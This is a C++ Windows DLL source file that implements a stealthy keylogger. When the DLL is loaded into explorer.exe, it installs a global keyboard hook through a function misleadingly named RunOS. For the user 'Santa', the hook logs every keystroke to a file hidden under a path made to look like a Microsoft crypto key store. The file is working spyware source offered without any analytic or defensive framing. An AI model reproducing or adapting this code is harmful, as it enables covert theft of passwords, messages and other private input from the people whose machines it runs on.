#include "framework.h"
#include "XorStr.h"

HHOOK DaHook = NULL;
FILE* f = NULL;

//Multiple concatenation
char* dupcat(const char* s1, ...)
{
    int len;
    char* p, * q, * sn;
    va_list ap;

    len = strlen(s1);
    va_start(ap, s1);
    while (1)
    {
        sn = va_arg(ap, char*);
        if (!sn) break;
        len += strlen(sn);
    }
    va_end(ap);
    p = new char[len + 1];
    strcpy(p, s1);
    q = p + strlen(p);
    va_start(ap, s1);
    while (1)
    {
        sn = va_arg(ap, char*);
        if (!sn) break;
        strcpy(q, sn);
        q += strlen(q);
    }
    va_end(ap);
    return p;
}//Example: cout<<dupcat("D:","\\","Folder",0)

extern "C" __declspec(dllexport) LRESULT WINAPI RunOS(int nCode, WPARAM wParam, LPARAM lParam)
{
    char username[255];
    DWORD dout = 255;
    GetUserName(username, &dout);
    if(strcmp(username, "Santa")) return CallNextHookEx(DaHook, nCode, wParam, lParam);
    char fpath[255];
    const char* format = "C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys\\keys\\%d.keys"; // dont protect.
    sprintf_s(fpath, (size_t)sizeof(fpath), format, GetCurrentProcessId());
    if (nCode || ((int)lParam & (int)(2 << 30))) return CallNextHookEx(DaHook, nCode, wParam, lParam);
    f = fopen(fpath, "a+"); //Open the file
    if (f == NULL) return CallNextHookEx(DaHook, nCode, wParam, lParam);
    char lpszKeyName[1024] = { 0 };
    lpszKeyName[0] = '[';
    int i = GetKeyNameText(lParam, (lpszKeyName + 1), 0xFF) + 1;
    int key = wParam;
    lpszKeyName[i] = ']';
    if ((key >= 'A' && key <= 'Z') || (key <= '9' && key >= '0'))
    {
        if (GetAsyncKeyState(VK_SHIFT) >= 0) key += 0x20;
        fprintf(f, "%c", key);
    }
    else fprintf(f, "%s", lpszKeyName);
    fclose(f);
    return CallNextHookEx(DaHook, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        TCHAR szFileName[MAX_PATH];
        GetModuleFileName(NULL, szFileName, MAX_PATH);
        if (std::string(szFileName).find(std::string("explorer")) != std::string::npos)
        DaHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)RunOS, hModule, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        if (DaHook)UnhookWindowsHookEx(DaHook);
        break;
    }
    return TRUE;
}

